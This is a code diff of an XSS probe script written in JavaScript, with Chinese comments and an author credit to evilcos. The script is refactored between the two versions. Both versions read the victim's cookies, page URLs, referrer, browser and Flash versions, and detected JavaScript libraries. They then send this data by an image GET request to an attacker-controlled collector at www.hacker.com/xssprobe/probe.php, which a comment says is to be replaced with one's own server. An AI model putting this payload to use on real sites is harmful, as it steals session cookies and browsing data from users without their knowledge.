@@ -4,85 +4,75 @@ by evilcos@gmail.com | @xeyeteam
 
 */
 
-(function(w,d,n) {
-	/*
-		缩短变量长度
-		w:window, d:document, n:navigator
+(function( window, document, navigator, undefined ) {
+	var HTTP_SERVER = "http://www.hacker.com/xssprobe/probe.php?c=",
+		// 获取隐私信息的服务端页面，这里需配置为自己的probe.php网址
+		NOT_AVAILABLE = "N/A", FOUND = "found";
 
-		by ChiChou
-		2013-10-30
-		http://ChiChou.0ginr.com/
-	*/
-	
-	// 获取隐私信息的服务端页面，这里需配置为自己的probe.php网址
-	var config = {
-		server: "http://www.hacker.com/xssprobe/probe.php?c="
-	};
-
-	//字符串常量
-	var U = 'unknown';
-
- 	// 隐私信息字典
-	var info = {
-		browser: (function() {
-			ua = n.userAgent.toLowerCase();
-			var rwebkit = /(webkit)[ \/]([\w.]+)/;
-			var ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/;
-			var rmsie = /(msie) ([\w.]+)/;
-			var rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/;
-			var match = rwebkit.exec( ua ) ||
-				ropera.exec( ua ) ||
-				rmsie.exec( ua ) ||
-				ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
-				[];
-			return {name: match[1] || "", version: match[2] || "0"};
-		})(),
-		ua: escape(n.userAgent),
-		lang: n.language,
-		referrer: escape(d.referrer),
-		location: escape(w.location.href),
-		toplocation: escape(top.location.href),
-		cookie: escape(d.cookie),
-		domain: d.domain,
-		title: d.title,
-		screen: self.screen ? screen.width + "x" + screen.height : U,
-		flash: (function() {
-			if (n.plugins && n.plugins.length) {
-				for (var i = 0; i<n.plugins.length; i++) {
-					var match = n.plugins[i].description.match(/^Shockwave Flash ([\s\S]*)$/);
-					if (match && match.length === 2)
-						return match[1];					
-				}
-			} else if (typeof window.ActiveXObject === "function") {
-				//等flash出到20那天再改吧
-				for (var i = 20; i>=2; i--) {
-					try {
-						if (new ActiveXObject('ShockwaveFlash.ShockwaveFlash.' + i)) 
-							return i + '.0';						
-					}
-					catch(e) {}
-				}
-			} else {
-				return U
-			}
-		})()
-	};
-
-	// 编码JSON格式
-	var	encode = function(o) {
-		if(window.JSON && typeof JSON.stringify === "function") 
-			return JSON.stringify(o)
-
+	function json2str(object) {
 		var arr = [];
-		for (var i in o)
-			arr.push("'" + i + "':" + (function(s) {
-				if (typeof s == 'object' && s != null)
-					return encode(s);
-				return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
-			})(o[i])
-		);
-		return '{' + arr.join(',') + '}';
+		var fmt = function(s) {
+			if (typeof s == 'object' && s != null) return json2str(s);
+			return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
+		}
+		for (var i in object) arr.push("'" + i + "':" + fmt(object[i]));
+		return '{' + arr.join(',') + '}';		
 	}
-	// GET方法发送信息到远程服务器
-	new Image().src = config.server + encode(info);
-})(window, document, navigator);
+
+	(function(info) {
+		new Image().src = HTTP_SERVER + json2str(info);
+	})({
+		browser: (function(){
+			ua = navigator.userAgent.toLowerCase();
+			var rwebkit = /(webkit)[ \/]([\w.]+)/,
+				ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/,
+				rmsie = /(msie) ([\w.]+)/,
+				rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/,
+				match = rwebkit.exec( ua ) ||
+					ropera.exec( ua ) ||
+					rmsie.exec( ua ) ||
+					ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
+					[];
+			return {name: match[1] || "", ver: match[2] || "0"};
+		})(),
+		ua: escape(navigator.userAgent),
+		lang: navigator.language,
+		referrer: document.referrer,
+		location: window.location.href,
+		topLocation: top.location.href,
+		cookie: escape(document.cookie),
+		domain: document.domain,
+		title: document.title,
+		screen: (function() {
+			var scr = screen || {
+                width: NOT_AVAILABLE,
+                height: NOT_AVAILABLE,
+                colorDepth: NOT_AVAILABLE
+            };
+			return scr ? [scr.width, "x", scr.height, ",", scr.colorDepth, "-bit"].join("") : "";
+		})(),
+		flash: (function(navigator) {
+			var plug, len, //保存plugins和length
+			 	matches; //保存正则表达式的匹配项目
+
+			if((plug = navigator.plugins) && (len = plug.length)) {
+				for (var i=0; i<len; i++) 
+					if (matches = plug[i].description.match(/Shockwave Flash ([\d\.]+) \w*/))
+						return matches[1];
+			} else {
+				return (new ActiveXObject("ShockwaveFlash.ShockwaveFlash")).GetVariable("$version")
+					.replace(/^.*\s+(\d+)\,(\d+).*$/, "$1.$2");
+			}
+		})(navigator),
+		//常见前端js框架和版本的探测
+		lib: {
+			jQuery: window.jQuery ? jQuery().jquery : NOT_AVAILABLE,
+			Zepto: window.Zepto ? FOUND : NOT_AVAILABLE,
+			Ext: window.Ext && Ext.versions ? Ext.versions.extjs : NOT_AVAILABLE,
+			dojo: window.dojo ? dojo.version : NOT_AVAILABLE,
+			Prototype : window.Prototype ? Prototype.Version : NOT_AVAILABLE,
+			YUI: typeof window.YUI == "function" ? YUI().version : NOT_AVAILABLE
+		}
+	});
+
+})( window, document, navigator );
